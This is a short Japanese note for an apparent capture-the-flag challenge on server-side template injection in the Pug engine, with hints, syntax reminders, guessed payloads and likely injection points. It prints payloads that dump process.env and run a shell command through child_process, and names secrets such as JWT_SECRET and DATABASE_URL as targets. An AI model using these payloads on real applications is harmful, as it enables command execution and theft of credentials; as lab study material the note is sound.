# SSTi ❌

**難易度:** ⭐⭐⭐⭐⭐⭐
**カテゴリ:** Server-Side Template Injection
**目標:** テンプレートインジェクションで機密情報を取得

## ヒント

- **テンプレートエンジン:** Pug (旧 Jade)
- **ターゲット:** `process.env` の環境変数
- **入力箇所:** ユーザー入力がテンプレートに渡される箇所

## Pug テンプレートの基本

```pug
// Pug は JavaScript が実行可能
#{variable}          // 変数展開
!{rawHtml}           // エスケープなし展開
- var x = 1          // JavaScript コード実行
```

## 攻撃ペイロード（推測）

```
#{process.env}
#{process.env.NODE_ENV}
#{require('child_process').execSync('whoami')}
```

## 調査ポイント

- プロフィール名
- フィードバックコメント
- 商品レビュー

## Node.js 環境変数の取得

```javascript
// 成功した場合
process.env.SECRET_KEY
process.env.DATABASE_URL
process.env.JWT_SECRET
```

## 検証ポイント

- [ ] テンプレートエンジンが使用されている箇所を特定
- [ ] ペイロードが解釈されるか確認
- [ ] 環境変数を抽出

## 解説

[未着手]
